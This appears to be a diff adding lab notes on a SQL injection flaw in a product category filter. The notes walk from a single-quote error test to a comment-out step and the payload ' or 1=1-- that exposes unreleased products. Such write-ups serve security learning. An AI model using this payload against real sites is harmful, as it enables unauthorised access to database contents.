@@ -1,0 +1,24 @@
+SQLi Vulnerability - Product Category Filter
+
+*** Query ***
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+*** Objective
+
+Display all products both released an unreleased
+
+*** Analysis
+
+SELECT * FROM products WHERE category = ''' AND released = 1    # Testing with a single quote => "Internal Server Error"
+SELECT * FROM products WHERE category = ''--' AND released = 1  # Commenting out
+
+The resulting query will be like below:
+
+SELECT * FROM products WHERE category = ''  # Displays nothing
+
+- We now try to display both released and unreleased products
+
+SELECT * FROM products WHERE category = '' or 1=1--'   # Payload => ' or 1=1--
+
+We then script the exploit
